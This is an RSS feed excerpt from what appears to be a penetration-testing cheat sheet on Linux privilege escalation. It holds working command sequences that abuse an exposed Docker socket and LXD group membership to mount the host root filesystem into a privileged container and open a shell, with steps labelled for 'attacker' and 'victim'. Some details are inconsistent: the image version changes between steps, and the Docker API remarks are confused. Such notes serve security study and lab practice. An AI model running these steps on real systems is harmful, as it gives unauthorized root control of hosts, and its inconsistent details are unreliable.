    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/linux/privileged-groups/docker/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/linux/privileged-groups/docker/</guid>
      <description>&lt;h1 id=&#34;docker-sockets&#34;&gt;Docker Sockets&lt;a class=&#34;anchor&#34; href=&#34;#docker-sockets&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Assume the socket is at &lt;code&gt;/app/docker.sock&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h2 id=&#34;download-standalone-docker-binary&#34;&gt;Download standalone docker binary&lt;a class=&#34;anchor&#34; href=&#34;#download-standalone-docker-binary&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;if only socket and no client, we download the docker binary&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://master.dockerproject.com/linux/x86_64/docker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod +x docker&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;list-running-containers&#34;&gt;List running containers&lt;a class=&#34;anchor&#34; href=&#34;#list-running-containers&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker -H unix:///app/docker.sock ps&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;create a container, mount &lt;code&gt;/&lt;/code&gt; on host to &lt;code&gt;/hostsystem&lt;/code&gt; in docker container&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Get a shell on the newly created container&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;docker-api&#34;&gt;Docker API&lt;a class=&#34;anchor&#34; href=&#34;#docker-api&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;Unix doesn&amp;rsquo;t really has an API interface. Unix uses a socket. This is CVE-2025-9074, specific to windows where any docker container can access the docker management API interface.&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/linux/privileged-groups/lxc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/linux/privileged-groups/lxc/</guid>
      <description>&lt;h1 id=&#34;check-permission&#34;&gt;Check permission&lt;a class=&#34;anchor&#34; href=&#34;#check-permission&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;User should be in group &lt;code&gt;116(lxd)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;id&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;download-image&#34;&gt;Download image&lt;a class=&#34;anchor&#34; href=&#34;#download-image&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;On your attacker machine, download this image and transfer it to our victim&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://images.linuxcontainers.org/images/alpine/3.19/amd64/default/20250918_13:00/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;exploit&#34;&gt;Exploit&lt;a class=&#34;anchor&#34; href=&#34;#exploit&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lxc image list&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lxc init alpine privesc -c security.privileged&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lxc config device add privesc host-root disk source&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/ path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/mnt/root recursive&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lxc start privesc&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lxc exec privesc /bin/sh&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /mnt/root&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
